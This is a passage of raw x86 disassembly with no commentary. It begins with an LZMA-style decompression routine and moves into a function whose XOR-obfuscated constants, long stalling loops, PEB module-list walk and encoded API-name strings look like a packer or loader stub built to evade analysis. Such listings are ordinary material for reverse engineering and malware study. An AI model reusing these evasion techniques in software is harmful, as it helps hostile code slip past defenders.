  4245cc:	mov    cl,BYTE PTR [ebp-0xc]
  4245cf:	and    edi,DWORD PTR [ebp-0x14]
  4245d2:	shl    edi,cl
  4245d4:	sub    cl,0x8
  4245d7:	neg    cl
  4245d9:	shr    esi,cl
  4245db:	pop    eax
  4245dc:	add    edi,esi
  4245de:	pop    esi
  4245df:	lea    edi,[edi+edi*2]
  4245e2:	shl    edi,0x8
  4245e5:	cmp    al,0x7
  4245e7:	pop    edx
  4245e8:	lea    ecx,[esi+edi*2+0xe6c]
  4245ef:	push   ecx
  4245f0:	push   esi
  4245f1:	mov    esi,0x100
  4245f6:	push   eax
  4245f7:	mov    al,0x1
  4245f9:	jb     0x42462f
  4245fb:	mov    edi,DWORD PTR [ebp-0x4]
  4245fe:	sub    edi,DWORD PTR [ebp-0x24]
  424601:	movzx  edi,BYTE PTR [edi]
  424604:	mov    ebp,DWORD PTR [ebp-0x34]
  424607:	shl    edi,1
  424609:	mov    ecx,esi
  42460b:	and    esi,edi
  42460d:	add    ecx,esi
  42460f:	lea    ebp,[ebp+ecx*2+0x0]
  424613:	call   0x4248c8
  424618:	mov    ecx,eax
  42461a:	shr    esi,0x8
  42461d:	and    ecx,0x1
  424620:	cmp    esi,ecx
  424622:	mov    esi,0x100
  424627:	jne    0x424637
  424629:	cmp    eax,esi
  42462b:	jb     0x424604
  42462d:	jmp    0x424643
  42462f:	mov    ebp,DWORD PTR [ebp-0x34]
  424632:	call   0x4248c8
  424637:	inc    eax
  424638:	inc    esi
  424639:	sub    eax,0x1
  42463c:	sub    esi,0x1
  42463f:	cmp    eax,esi
  424641:	jb     0x42462f
  424643:	pop    edx
  424644:	inc    edx
  424645:	cmp    edx,0x5
  424648:	dec    edx
  424649:	mov    ecx,edx
  42464b:	jb     0x42465c
  42464d:	inc    edx
  42464e:	cmp    edx,0xb
  424651:	dec    edx
  424652:	mov    cl,0x4
  424654:	dec    cl
  424656:	jb     0x42465c
  424658:	mov    cl,0x7
  42465a:	dec    cl
  42465c:	sub    edx,ecx
  42465e:	push   edx
  42465f:	jmp    0x4246b0
  424661:	mov    al,0xc1
  424663:	dec    al
  424665:	call   0x4248b9
  42466a:	jne    0x424680
  42466c:	pop    eax
  42466d:	pop    edi
  42466e:	pop    edx
  42466f:	pop    ecx
  424670:	pop    edx
  424671:	pop    ecx
  424672:	push   DWORD PTR [esp]
  424675:	push   ecx
  424676:	push   edx
  424677:	mov    edx,0x664
  42467c:	mov    cl,0x0
  42467e:	jmp    0x4246f3
  424680:	mov    al,0xcd
  424682:	dec    al
  424684:	call   0x4248b9
  424689:	jne    0x4246b9
  42468b:	mov    al,0xf1
  42468d:	dec    al
  42468f:	call   0x4248a9
  424694:	jne    0x4246e9
  424696:	pop    eax
  424697:	cmp    al,0x7
  424699:	mov    al,0x9
  42469b:	jb     0x42469f
  42469d:	mov    al,0xb
  42469f:	push   eax
  4246a0:	mov    esi,DWORD PTR [ebp-0x4]
  4246a3:	sub    esi,DWORD PTR [ebp-0x24]
  4246a6:	cmp    esi,DWORD PTR [ebp+0x24]
  4246a9:	jb     0x424880
  4246af:	lods   al,BYTE PTR ds:[esi]
  4246b0:	mov    edi,DWORD PTR [ebp-0x4]
  4246b3:	stos   BYTE PTR es:[edi],al
  4246b4:	jmp    0x424847
  4246b9:	mov    al,0xd8
  4246bb:	call   0x4248b9
  4246c0:	mov    esi,DWORD PTR [ebp-0x28]
  4246c3:	je     0x4246e0
  4246c5:	mov    al,0xe4
  4246c7:	call   0x4248b9
  4246cc:	mov    esi,DWORD PTR [ebp-0x2c]
  4246cf:	je     0x4246da
  4246d1:	mov    esi,DWORD PTR [ebp-0x30]
  4246d4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4246d7:	mov    DWORD PTR [ebp-0x30],ecx
  4246da:	mov    ecx,DWORD PTR [ebp-0x28]
  4246dd:	mov    DWORD PTR [ebp-0x2c],ecx
  4246e0:	mov    ecx,DWORD PTR [ebp-0x24]
  4246e3:	mov    DWORD PTR [ebp-0x28],ecx
  4246e6:	mov    DWORD PTR [ebp-0x24],esi
  4246e9:	pop    eax
  4246ea:	pop    edi
  4246eb:	pop    ecx
  4246ec:	mov    edx,0xa68
  4246f1:	mov    cl,0x8
  4246f3:	add    edx,edi
  4246f5:	push   edx
  4246f6:	push   edi
  4246f7:	cmp    al,0x7
  4246f9:	mov    al,cl
  4246fb:	jb     0x4246ff
  4246fd:	add    al,0x3
  4246ff:	push   eax
  424700:	mov    ebp,DWORD PTR [ebp-0x34]
  424703:	call   0x4248c6
  424708:	jne    0x42471e
  42470a:	mov    eax,DWORD PTR [ebp-0x18]
  42470d:	mov    edi,DWORD PTR [ebp-0x34]
  424710:	shl    eax,0x3
  424713:	sub    ecx,ecx
  424715:	push   0x8
  424717:	pop    esi
  424718:	lea    edi,[edi+eax*2+0x4]
  42471c:	jmp    0x424753
  42471e:	mov    ebp,DWORD PTR [ebp-0x34]
  424721:	add    ebp,0x2
  424724:	call   0x4248c6
  424729:	jne    0x424743
  42472b:	mov    eax,DWORD PTR [ebp-0x18]
  42472e:	mov    edi,DWORD PTR [ebp-0x34]
  424731:	shl    eax,0x3
  424734:	push   0x8
  424736:	pop    ecx
  424737:	push   0x8
  424739:	pop    esi
  42473a:	lea    edi,[edi+eax*2+0x104]
  424741:	jmp    0x424753
  424743:	mov    edi,0x204
  424748:	add    edi,DWORD PTR [ebp-0x34]
  42474b:	push   0x10
  42474d:	pop    ecx
  42474e:	mov    esi,0x100
  424753:	mov    DWORD PTR [ebp-0x1c],ecx
  424756:	sub    eax,eax
  424758:	inc    eax
  424759:	mov    ebp,edi
  42475b:	call   0x4248c8
  424760:	mov    ecx,eax
  424762:	sub    ecx,esi
  424764:	jb     0x424759
  424766:	add    DWORD PTR [ebp-0x1c],ecx
  424769:	cmp    DWORD PTR [ebp-0x3c],0x4
  42476d:	jae    0x424823
  424773:	add    DWORD PTR [ebp-0x3c],0x7
  424777:	mov    ecx,DWORD PTR [ebp-0x1c]
  42477a:	cmp    ecx,0x4
  42477d:	jb     0x424782
  42477f:	push   0x3
  424781:	pop    ecx
  424782:	mov    edi,DWORD PTR [ebp-0x38]
  424785:	shl    ecx,0x6
  424788:	sub    eax,eax
  42478a:	inc    eax
  42478b:	push   0x40
  42478d:	pop    esi
  42478e:	lea    edi,[edi+ecx*2+0x360]
  424795:	mov    ebp,edi
  424797:	call   0x4248c8
  42479c:	mov    ecx,eax
  42479e:	sub    ecx,esi
  4247a0:	jb     0x424795
  4247a2:	mov    DWORD PTR [ebp-0x18],ecx
  4247a5:	mov    DWORD PTR [ebp-0x24],ecx
  4247a8:	cmp    ecx,0x4
  4247ab:	jb     0x424820
  4247ad:	mov    esi,ecx
  4247af:	and    DWORD PTR [ebp-0x24],0x1
  4247b3:	shr    esi,1
  4247b5:	or     DWORD PTR [ebp-0x24],0x2
  4247b9:	dec    esi
  4247ba:	cmp    ecx,0xe
  4247bd:	jae    0x4247d8
  4247bf:	mov    eax,0x2af
  4247c4:	sub    eax,ecx
  4247c6:	mov    ecx,esi
  4247c8:	shl    BYTE PTR [ebp-0x24],cl
  4247cb:	add    eax,DWORD PTR [ebp-0x24]
  4247ce:	shl    eax,1
  4247d0:	add    eax,DWORD PTR [ebp-0x38]
  4247d3:	mov    DWORD PTR [ebp-0x34],eax
  4247d6:	jmp    0x424805
  4247d8:	sub    esi,0x4
  4247db:	call   0x424885
  4247e0:	shr    ebx,1
  4247e2:	shl    DWORD PTR [ebp-0x24],1
  4247e5:	cmp    DWORD PTR [ebp-0x20],ebx
  4247e8:	jb     0x4247f0
  4247ea:	inc    DWORD PTR [ebp-0x24]
  4247ed:	sub    DWORD PTR [ebp-0x20],ebx
  4247f0:	dec    esi
  4247f1:	jne    0x4247db
  4247f3:	mov    eax,0x644
  4247f8:	add    eax,DWORD PTR [ebp-0x38]
  4247fb:	mov    DWORD PTR [ebp-0x34],eax
  4247fe:	shl    DWORD PTR [ebp-0x24],0x4
  424802:	push   0x4
  424804:	pop    esi
  424805:	sub    edi,edi
  424807:	inc    edi
  424808:	mov    eax,edi
  42480a:	mov    ebp,DWORD PTR [ebp-0x34]
  42480d:	call   0x4248c8
  424812:	test   al,0x1
  424814:	je     0x424819
  424816:	or     DWORD PTR [ebp-0x24],edi
  424819:	shl    edi,1
  42481b:	dec    esi
  42481c:	jne    0x42480a
  42481e:	jmp    0x424820
  424820:	inc    DWORD PTR [ebp-0x24]
  424823:	mov    ecx,DWORD PTR [ebp-0x1c]
  424826:	add    ecx,0x2
  424829:	mov    edi,DWORD PTR [ebp-0x4]
  42482c:	mov    eax,edi
  42482e:	sub    eax,DWORD PTR [ebp+0x24]
  424831:	cmp    DWORD PTR [ebp-0x24],eax
  424834:	ja     0x424880
  424836:	mov    esi,edi
  424838:	sub    esi,DWORD PTR [ebp-0x24]
  42483b:	mov    edx,DWORD PTR [ebp+0x28]
  42483e:	lods   al,BYTE PTR ds:[esi]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	cmp    edi,edx
  424842:	jae    0x424847
  424844:	dec    ecx
  424845:	jne    0x42483e
  424847:	mov    DWORD PTR [ebp-0x4],edi
  42484a:	movzx  esi,al
  42484d:	cmp    edi,DWORD PTR [ebp+0x28]
  424850:	jb     0x4245b1
  424856:	call   0x424885
  42485b:	sub    eax,eax
  42485d:	lea    ebp,[esp+0x3c]
  424861:	mov    edx,DWORD PTR [ebp+0x20]
  424864:	mov    esi,DWORD PTR [ebp-0x8]
  424867:	sub    esi,DWORD PTR [ebp+0x18]
  42486a:	mov    DWORD PTR [edx],esi
  42486c:	mov    edx,DWORD PTR [ebp+0x2c]
  42486f:	mov    edi,DWORD PTR [ebp-0x4]
  424872:	sub    edi,DWORD PTR [ebp+0x24]
  424875:	mov    DWORD PTR [edx],edi
  424877:	leave  
  424878:	pop    ebx
  424879:	pop    esi
  42487a:	pop    edi
  42487b:	ret    0x1c
  42487e:	pop    esi
  42487f:	pop    eax
  424880:	sub    eax,eax
  424882:	inc    eax
  424883:	jmp    0x42485d
  424885:	cmp    ebx,0x1000000
  42488b:	jb     0x42488e
  42488d:	ret    
  42488e:	shl    ebx,0x8
  424891:	push   esi
  424892:	mov    esi,DWORD PTR [ebp-0x8]
  424895:	cmp    esi,DWORD PTR [ebp+0x1c]
  424898:	jae    0x42487e
  42489a:	mov    eax,DWORD PTR [ebp-0x20]
  42489d:	shl    eax,0x8
  4248a0:	lods   al,BYTE PTR ds:[esi]
  4248a1:	scas   eax,DWORD PTR es:[edi]
  4248a2:	sahf   
  4248a3:	or     al,0xaf
  4248a5:	pop    esi
  4248a6:	ins    BYTE PTR es:[edi],dx
  4248a7:	add    bl,BYTE PTR [eax-0x3a634149]
  4248ad:	arpl   WORD PTR [eax+edx*4-0x616a66f0],cx
  4248b4:	sub    al,0x95
  4248b6:	nop
  4248b7:	cmp    BYTE PTR [ecx-0x6a739c3b],ah
  4248bd:	sahf   
  4248be:	pushf  
  4248bf:	mov    bh,0x3e
  4248c1:	lods   al,BYTE PTR ds:[esi]
  4248c2:	mov    edi,0x35899e3a
  4248c7:	mov    WORD PTR [edi-0x707661c6],?
  4248cd:	js     0x424858
  4248cf:	mov    DWORD PTR [ecx-0x4806a973],ecx
  4248d5:	mov    edx,0x1a906919
  4248da:	sbb    DWORD PTR [ecx],ecx
  4248dc:	test   eax,0xfa19ba75
  4248e1:	push   esi
  4248e2:	sti    
  4248e3:	mov    bl,0xcd
  4248e5:	mov    BYTE PTR [edx+0x18906919],bl
  4248eb:	test   eax,0x919daab
  4248f0:	mov    bh,0xb8
  4248f2:	lds    esp,FWORD PTR [edi-0x22]
  4248f5:	mov    DWORD PTR [eax+0x47c5b530],edx
  4248fb:	mov    ah,0x6d
  4248fd:	mov    edx,0xe5560919
  424902:	mov    bh,0xf0
  424904:	outs   dx,DWORD PTR ds:[esi]
  424905:	mov    DWORD PTR [ecx-0x4bca7677],ebp
  42490b:	nop
  42490c:	xor    BYTE PTR [ebp-0x764172de],bl
  424912:	xchg   ebp,eax
  424913:	mov    WORD PTR [edi-0x6775e6c6],?
  424919:	nop
  42491a:	xor    al,0x9d
  42491c:	sub    eax,0x350919ba
  424921:	fldenv [esi+0x29]
  424924:	push   ebp
  424925:	add    BYTE PTR [ebx],al
  424927:	rol    BYTE PTR [ebx+0x6c8d01c0],0x24
  42492e:	inc    eax
  42492f:	ret    
  424930:	push   ebp
  424931:	mov    ebp,esp
  424933:	sub    esp,0x12c
  424939:	push   ebx
  42493a:	push   esi
  42493b:	push   edi
  42493c:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  424943:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42494a:	mov    eax,DWORD PTR [ebp+0x8]
  42494d:	mov    DWORD PTR [ebp+0x8],eax
  424950:	mov    ecx,DWORD PTR [ebp-0x10]
  424953:	mov    ebx,0x75108af
  424958:	xor    ecx,ebx
  42495a:	mov    eax,0x3272f6
  42495f:	add    ecx,eax
  424961:	mov    DWORD PTR [ebp-0x2c],ecx
  424964:	mov    ecx,DWORD PTR [ebp-0x10]
  424967:	xor    ecx,ebx
  424969:	add    ecx,eax
  42496b:	mov    DWORD PTR [ebp-0x3c],ecx
  42496e:	mov    ecx,DWORD PTR [ebp-0x10]
  424971:	xor    ecx,ebx
  424973:	add    ecx,eax
  424975:	mov    DWORD PTR [ebp-0x40],ecx
  424978:	mov    ecx,DWORD PTR [ebp-0x10]
  42497b:	xor    ecx,ebx
  42497d:	add    ecx,eax
  42497f:	mov    DWORD PTR [ebp-0xd8],ecx
  424985:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  42498c:	mov    DWORD PTR [ebp-0x40],0xf89cb5a5
  424993:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  42499a:	push   0x25
  42499c:	pop    ecx
  42499d:	mov    DWORD PTR [ebp-0x38],ecx
  4249a0:	mov    DWORD PTR [ebp-0x38],ecx
  4249a3:	push   0x65
  4249a5:	pop    ecx
  4249a6:	mov    DWORD PTR [ebp-0x38],ecx
  4249a9:	mov    DWORD PTR [ebp-0x38],ecx
  4249ac:	mov    DWORD PTR [ebp-0x38],0x4d
  4249b3:	mov    DWORD PTR [ebp-0x38],0x43
  4249ba:	mov    ecx,DWORD PTR [ebp-0x10]
  4249bd:	xor    ecx,ebx
  4249bf:	add    ecx,eax
  4249c1:	mov    DWORD PTR [ebp-0x38],ecx
  4249c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4249c7:	xor    ecx,ebx
  4249c9:	add    ecx,eax
  4249cb:	mov    DWORD PTR [ebp-0x38],ecx
  4249ce:	mov    DWORD PTR [ebp-0x28],0x258
  4249d5:	mov    DWORD PTR [ebp-0x20],0x36
  4249dc:	mov    DWORD PTR [ebp-0x14],0x7a
  4249e3:	lea    edi,[ebp-0x10c]
  4249e9:	lea    esi,[ebp-0x12c]
  4249ef:	call   0x4256b1
  4249f4:	dec    DWORD PTR [ebp-0x14]
  4249f7:	jne    0x4249e3
  4249f9:	dec    DWORD PTR [ebp-0x20]
  4249fc:	jne    0x4249dc
  4249fe:	dec    DWORD PTR [ebp-0x28]
  424a01:	jne    0x4249d5
  424a03:	mov    DWORD PTR [ebp-0x28],0x400e
  424a0a:	mov    eax,DWORD PTR [ebp-0x10]
  424a0d:	xor    eax,ebx
  424a0f:	mov    esi,0x3272f6
  424a14:	add    eax,esi
  424a16:	mov    DWORD PTR [ebp-0x1c],eax
  424a19:	mov    eax,DWORD PTR [ebp-0x10]
  424a1c:	and    DWORD PTR [ebp-0x94],0x0
  424a23:	xor    eax,ebx
  424a25:	add    eax,esi
  424a27:	mov    DWORD PTR [ebp-0x34],eax
  424a2a:	mov    eax,fs:0x18
  424a30:	mov    DWORD PTR [ebp-0x94],eax
  424a36:	mov    eax,DWORD PTR [eax+0x30]
  424a39:	mov    DWORD PTR [ebp-0xcc],eax
  424a3f:	mov    eax,DWORD PTR [eax+0xc]
  424a42:	mov    DWORD PTR [ebp-0xc0],eax
  424a48:	mov    eax,DWORD PTR [ebp+0x8]
  424a4b:	lea    ecx,[ebp-0x94]
  424a51:	mov    DWORD PTR [eax+0x1a0],ecx
  424a57:	mov    eax,DWORD PTR [ebp+0x8]
  424a5a:	lea    ecx,[ebp-0xcc]
  424a60:	mov    DWORD PTR [eax+0x1a4],ecx
  424a66:	mov    eax,DWORD PTR [ebp+0x8]
  424a69:	push   DWORD PTR [ebp+0x8]
  424a6c:	lea    ecx,[ebp-0xc0]
  424a72:	mov    DWORD PTR [eax+0x1a8],ecx
  424a78:	call   0x426e72
  424a7d:	mov    ecx,DWORD PTR [ebp-0x10]
  424a80:	xor    ecx,ebx
  424a82:	add    ecx,esi
  424a84:	cmp    ecx,eax
  424a86:	je     0x424e09
  424a8c:	mov    eax,DWORD PTR [ebp+0x8]
  424a8f:	mov    eax,DWORD PTR [eax+0x194]
  424a95:	mov    ecx,DWORD PTR [eax]
  424a97:	mov    eax,DWORD PTR [ebp+0x8]
  424a9a:	mov    eax,DWORD PTR [eax+0x194]
  424aa0:	mov    eax,DWORD PTR [eax]
  424aa2:	add    eax,DWORD PTR [ecx+0x3c]
  424aa5:	mov    ecx,DWORD PTR [ebp+0x8]
  424aa8:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424aae:	lea    edx,[ebp-0xec]
  424ab4:	push   edx
  424ab5:	mov    edx,DWORD PTR [ebp+0x8]
  424ab8:	mov    edx,DWORD PTR [edx+0x18c]
  424abe:	mov    edx,DWORD PTR [edx]
  424ac0:	add    edx,DWORD PTR [eax+0x88]
  424ac6:	push   0x4
  424ac8:	push   DWORD PTR [eax+0x8c]
  424ace:	push   edx
  424acf:	call   DWORD PTR [ecx+0x1c]
  424ad2:	push   DWORD PTR [ebp+0x8]
  424ad5:	xor    eax,eax
  424ad7:	mov    DWORD PTR [ebp-0xa8],0x1b40103a
  424ae1:	mov    DWORD PTR [ebp-0xa4],0x14371122
  424aeb:	mov    DWORD PTR [ebp-0xa0],0x42111e0c
  424af5:	mov    BYTE PTR [ebp-0x9c],0x83
  424afc:	lea    edi,[ebp-0x9b]
  424b02:	stos   DWORD PTR es:[edi],eax
  424b03:	stos   WORD PTR es:[edi],ax
  424b05:	stos   BYTE PTR es:[edi],al
  424b06:	xor    eax,eax
  424b08:	mov    DWORD PTR [ebp-0xbc],0x1b40103a
  424b12:	mov    DWORD PTR [ebp-0xb8],0x14371122
  424b1c:	mov    DWORD PTR [ebp-0xb4],0x2c111e0c
  424b26:	mov    BYTE PTR [ebp-0xb0],0x83
  424b2d:	lea    edi,[ebp-0xaf]
  424b33:	stos   DWORD PTR es:[edi],eax
  424b34:	stos   WORD PTR es:[edi],ax
  424b36:	stos   BYTE PTR es:[edi],al
  424b37:	mov    edi,DWORD PTR [ebp+0x8]
  424b3a:	mov    eax,DWORD PTR [ebp+0x8]
  424b3d:	mov    edx,DWORD PTR [eax+0x1b8]
  424b43:	mov    DWORD PTR [ebp-0x68],0x110f1017
  424b4a:	mov    DWORD PTR [ebp-0x64],0x1a131620
  424b51:	mov    WORD PTR [ebp-0x60],0x8342
  424b57:	mov    DWORD PTR [ebp-0x90],0x1b40103a
  424b61:	mov    DWORD PTR [ebp-0x8c],0x17421122
  424b6b:	mov    DWORD PTR [ebp-0x88],0x35221b13
  424b75:	mov    DWORD PTR [ebp-0x84],0x111e160e
  424b7f:	mov    DWORD PTR [ebp-0x80],0x8342201a
  424b86:	mov    DWORD PTR [ebp-0x7c],0x1b40103a
  424b8d:	mov    DWORD PTR [ebp-0x78],0x17421122
  424b94:	mov    DWORD PTR [ebp-0x74],0x35221b13
  424b9b:	mov    DWORD PTR [ebp-0x70],0x111e160e
  424ba2:	mov    DWORD PTR [ebp-0x6c],0x832c201a
  424ba9:	call   0x426ea1
  424bae:	push   eax
  424baf:	mov    eax,DWORD PTR [ebp+0x8]
  424bb2:	mov    eax,DWORD PTR [eax+0x1a8]
  424bb8:	push   DWORD PTR [eax]
  424bba:	call   0x426b42
  424bbf:	test   eax,eax
  424bc1:	jne    0x424c13
  424bc3:	mov    eax,DWORD PTR [ebp+0x8]
  424bc6:	mov    eax,DWORD PTR [eax+0x1e0]
  424bcc:	mov    edi,DWORD PTR [ebp+0x8]
  424bcf:	add    eax,0x4
  424bd2:	mov    DWORD PTR [ebp-0x24],eax
  424bd5:	mov    eax,DWORD PTR [ebp+0x8]
  424bd8:	mov    edx,DWORD PTR [eax+0x1b8]
  424bde:	call   0x426ea1
  424be3:	push   eax
  424be4:	mov    eax,DWORD PTR [ebp-0x24]
  424be7:	call   DWORD PTR [eax]
  424be9:	test   eax,eax
  424beb:	jne    0x424c13
  424bed:	mov    eax,DWORD PTR [ebp+0x8]
  424bf0:	mov    eax,DWORD PTR [eax+0x1e0]
  424bf6:	mov    edi,DWORD PTR [ebp+0x8]
  424bf9:	add    eax,0x10
  424bfc:	mov    DWORD PTR [ebp-0x24],eax
  424bff:	mov    eax,DWORD PTR [ebp+0x8]
  424c02:	mov    edx,DWORD PTR [eax+0x1b8]
  424c08:	call   0x426ea1
  424c0d:	push   eax
  424c0e:	mov    eax,DWORD PTR [ebp-0x24]
  424c11:	call   DWORD PTR [eax]
  424c13:	mov    eax,DWORD PTR [ebp-0x10]
  424c16:	mov    ecx,DWORD PTR [ebp-0x28]
  424c19:	xor    eax,ebx
  424c1b:	add    eax,esi
  424c1d:	cmp    eax,ecx
  424c1f:	je     0x424de2
  424c25:	mov    eax,DWORD PTR [ebp-0x18]
  424c28:	xor    eax,ebx
  424c2a:	mov    ecx,0xffcd8d0a
  424c2f:	sub    ecx,eax
  424c31:	add    ecx,DWORD PTR [ebp-0x28]
  424c34:	mov    eax,DWORD PTR [ebp-0x1c]
  424c37:	cmp    eax,ecx
  424c39:	ja     0x424de2
  424c3f:	mov    DWORD PTR [ebp-0x20],0x0
  424c46:	push   DWORD PTR [ebp+0x8]
  424c49:	mov    edi,DWORD PTR [ebp+0x8]
  424c4c:	mov    eax,DWORD PTR [ebp+0x8]
  424c4f:	mov    edx,DWORD PTR [eax+0x1b4]
  424c55:	call   0x426ea1
  424c5a:	push   eax
  424c5b:	mov    eax,DWORD PTR [ebp+0x8]
  424c5e:	mov    eax,DWORD PTR [eax+0x1a8]
  424c64:	push   DWORD PTR [eax]
  424c66:	call   0x426b42
  424c6b:	mov    ecx,DWORD PTR [ebp+0x8]
  424c6e:	mov    ecx,DWORD PTR [ecx+0x19c]
  424c74:	mov    DWORD PTR [ecx],eax
  424c76:	mov    eax,DWORD PTR [ebp+0x8]
  424c79:	mov    edi,DWORD PTR [eax+0x1e0]
  424c7f:	mov    esi,DWORD PTR [ebp+0x8]
  424c82:	xor    eax,eax
  424c84:	lea    edx,[ebp-0x7c]
  424c87:	call   0x426ed7
  424c8c:	push   eax
  424c8d:	mov    eax,DWORD PTR [ebp+0x8]
  424c90:	mov    eax,DWORD PTR [eax+0x19c]
  424c96:	push   DWORD PTR [eax]
  424c98:	call   DWORD PTR [edi+0x8]
  424c9b:	mov    DWORD PTR [ebp-0x24],eax
  424c9e:	mov    eax,DWORD PTR [ebp+0x8]
  424ca1:	mov    edi,DWORD PTR [eax+0x1e0]
  424ca7:	mov    esi,DWORD PTR [ebp+0x8]
  424caa:	xor    eax,eax
  424cac:	lea    edx,[ebp-0x90]
  424cb2:	call   0x426ed7
  424cb7:	push   eax
  424cb8:	mov    eax,DWORD PTR [ebp+0x8]
  424cbb:	mov    eax,DWORD PTR [eax+0x19c]
  424cc1:	push   DWORD PTR [eax]
  424cc3:	call   DWORD PTR [edi+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edi,DWORD PTR [eax+0x1e0]
  424ccf:	mov    esi,DWORD PTR [ebp+0x8]
  424cd2:	xor    eax,eax
  424cd4:	lea    edx,[ebp-0xa8]
  424cda:	call   0x426ed7
  424cdf:	push   eax
  424ce0:	mov    eax,DWORD PTR [ebp+0x8]
  424ce3:	mov    eax,DWORD PTR [eax+0x19c]
  424ce9:	push   DWORD PTR [eax]
  424ceb:	call   DWORD PTR [edi+0x8]
  424cee:	and    DWORD PTR [ebp-0x8],0x0
  424cf2:	mov    DWORD PTR [ebp-0x44],eax
  424cf5:	mov    eax,DWORD PTR [ebp-0x8]
  424cf8:	and    eax,0x7
  424cfb:	add    eax,0x31
  424cfe:	push   eax
  424cff:	call   DWORD PTR [ebp-0x24]
  424d02:	test   eax,eax
  424d04:	je     0x424d48
  424d06:	mov    eax,DWORD PTR [ebp-0x8]
  424d09:	push   0x19
  424d0b:	xor    edx,edx
  424d0d:	pop    ecx
  424d0e:	div    ecx
  424d10:	add    dl,0x41
  424d13:	movzx  eax,dl
  424d16:	push   eax
  424d17:	call   DWORD PTR [ebp-0x44]
  424d1a:	test   eax,eax
  424d1c:	jne    0x424d48
  424d1e:	mov    eax,DWORD PTR [ebp+0x8]
  424d21:	mov    edi,DWORD PTR [eax+0x1e0]
  424d27:	mov    esi,DWORD PTR [ebp+0x8]
  424d2a:	xor    eax,eax
  424d2c:	lea    edx,[ebp-0x68]
  424d2f:	call   0x426ed7
  424d34:	push   eax
  424d35:	mov    eax,DWORD PTR [ebp+0x8]
  424d38:	mov    eax,DWORD PTR [eax+0x198]
  424d3e:	push   DWORD PTR [eax]
  424d40:	call   DWORD PTR [edi+0x8]
  424d43:	mov    DWORD PTR [ebp-0x14],eax
  424d46:	jmp    0x424d4c
  424d48:	and    DWORD PTR [ebp-0x14],0x0
  424d4c:	inc    DWORD PTR [ebp-0x8]
  424d4f:	cmp    DWORD PTR [ebp-0x8],0x10
  424d53:	jb     0x424cf5
  424d55:	mov    eax,DWORD PTR [ebp-0x18]
  424d58:	mov    esi,DWORD PTR [ebp+0x8]
  424d5b:	xor    eax,ebx
  424d5d:	mov    edi,0x3272f6
  424d62:	add    eax,edi
  424d64:	lea    edx,[ebp-0x10c]
  424d6a:	call   0x426ed7
  424d6f:	push   eax
  424d70:	mov    eax,DWORD PTR [ebp-0x10]
  424d73:	mov    esi,DWORD PTR [ebp+0x8]
  424d76:	xor    eax,ebx
  424d78:	add    eax,edi
  424d7a:	lea    edx,[ebp-0x12c]
  424d80:	call   0x426ed7
  424d85:	push   eax
  424d86:	call   DWORD PTR [ebp-0x14]
  424d89:	mov    ecx,DWORD PTR [ebp-0x10]
  424d8c:	xor    ecx,ebx
  424d8e:	add    ecx,edi
  424d90:	cmp    ecx,eax
  424d92:	jne    0x424d9b
  424d94:	mov    DWORD PTR [ebp-0x20],0x1
  424d9b:	mov    eax,DWORD PTR [ebp-0x18]
  424d9e:	mov    ecx,DWORD PTR [ebp-0x1c]
  424da1:	xor    eax,ebx
  424da3:	lea    eax,[eax+ecx*1+0x3272f6]
  424daa:	mov    DWORD PTR [ebp-0x1c],eax
  424dad:	mov    eax,DWORD PTR [ebp-0x20]
  424db0:	test   eax,eax
  424db2:	je     0x424dc6
  424db4:	mov    eax,DWORD PTR [ebp-0x18]
  424db7:	mov    ecx,DWORD PTR [ebp-0x34]
  424dba:	xor    eax,ebx
  424dbc:	lea    eax,[eax+ecx*1+0x3272f6]
  424dc3:	mov    DWORD PTR [ebp-0x34],eax
  424dc6:	mov    eax,DWORD PTR [ebp-0x18]
  424dc9:	xor    eax,ebx
  424dcb:	mov    ecx,0xffcd8d0a
  424dd0:	sub    ecx,eax
  424dd2:	add    ecx,DWORD PTR [ebp-0x28]
  424dd5:	mov    eax,DWORD PTR [ebp-0x1c]
  424dd8:	cmp    eax,ecx
  424dda:	jbe    0x424c3f
  424de0:	mov    esi,edi
  424de2:	mov    eax,DWORD PTR [ebp-0x34]
  424de5:	mov    ecx,DWORD PTR [ebp-0x1c]
  424de8:	cmp    ecx,eax
  424dea:	jne    0x424dfd
  424dec:	push   DWORD PTR [ebp+0x8]
  424def:	lea    eax,[ebp-0x3c]
  424df2:	push   eax
  424df3:	call   0x427946
  424df8:	mov    DWORD PTR [ebp-0x2c],eax
  424dfb:	jmp    0x424e09
  424dfd:	mov    eax,DWORD PTR [ebp-0x2c]
  424e00:	mov    ecx,DWORD PTR [ebp-0x18]
  424e03:	xor    ecx,ebx
  424e05:	add    ecx,esi
  424e07:	xor    DWORD PTR [eax],ecx
  424e09:	mov    eax,DWORD PTR [ebp-0x10]
  424e0c:	mov    ecx,DWORD PTR [ebp-0x2c]
  424e0f:	xor    eax,ebx
  424e11:	add    eax,esi
  424e13:	cmp    eax,ecx
  424e15:	je     0x42558f
  424e1b:	mov    eax,DWORD PTR [ebp-0x10]
  424e1e:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e21:	xor    eax,ebx
  424e23:	add    eax,esi
  424e25:	cmp    eax,ecx
  424e27:	je     0x42558f
  424e2d:	mov    eax,DWORD PTR [ebp-0x10]
  424e30:	xor    eax,ebx
  424e32:	add    eax,esi
  424e34:	jmp    0x424e52
  424e36:	mov    edi,DWORD PTR [ebp-0x2c]
  424e39:	mov    cl,al
  424e3b:	and    cl,0x1f
  424e3e:	or     dl,0xff
  424e41:	sub    dl,cl
  424e43:	add    BYTE PTR [edi+eax*1],dl
  424e46:	mov    ecx,DWORD PTR [ebp-0x18]
  424e49:	xor    ecx,ebx
  424e4b:	lea    eax,[eax+ecx*1+0x3272f6]
  424e52:	mov    ecx,DWORD PTR [ebp-0x3c]
  424e55:	cmp    eax,ecx
  424e57:	jb     0x424e36
  424e59:	mov    eax,DWORD PTR [ebp-0x3c]
  424e5c:	mov    DWORD PTR [ebp-0x28],eax
  424e5f:	mov    eax,DWORD PTR [ebp-0x2c]
  424e62:	mov    DWORD PTR [ebp-0x34],0xf89c85a5
  424e69:	mov    DWORD PTR [ebp-0xd4],eax
  424e6f:	mov    edi,0xf89c85a4
